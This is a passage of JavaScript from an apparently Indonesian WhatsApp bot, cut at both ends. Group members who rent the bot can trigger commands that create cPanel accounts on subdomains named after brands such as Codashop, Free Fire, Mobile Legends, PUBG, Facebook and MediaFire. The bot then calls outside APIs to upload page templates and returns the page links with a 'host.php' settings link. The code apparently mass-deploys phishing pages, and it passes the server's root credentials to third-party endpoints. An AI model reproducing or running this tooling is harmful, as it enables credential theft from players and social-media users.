*Hari Ini ${hariini}*

⸼  ࣪ ׅ ︶︶︶  𖣇𖢅𖣇  ︶︶︶ ⸼  ࣪ ׅ
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'webp1' :
id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafirel" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/fire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/fire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                    // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                    hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`Hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
case 'webp2' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "medafire2" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/fire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/fire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp3' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "grupwa" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/wa/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/wa/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp4' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashop" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.chat.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/cod/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/cod/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp5' :

id = msg.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefireI" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ff/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ff/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp6' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "freefire2" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ff2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ff2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp7' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "pubgm12" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/bg/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/bg/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub SC GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break

// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp8' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mlbb" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("_*PROSES DECK JEDA 2-3 MENIT*_")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/ml/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/ml/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub sc GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break

// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'webp9' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_PROSES DECK JEDA 2-3 MENIT_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiinew.newnesia.biz.id/web/tok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiinew.newnesia.biz.id/web/tok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub sv GG¹ :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
case 'we0' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "fb" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_PROSES DECK JEDA 2-3 MENIT_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://apiii-newbotwebp.newnesia.biz.id/web/fb/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://apiii-newbotwebp.newnesia.biz.id/web/fb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
==========================
➢ Grub Jasteb GG :
https://chat.whatsapp.com/JzXpGWhy6FT0B3evbjYiA9
==========================
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan
==========================`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner Ku Untuk Sewa")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim11' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grupv5/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
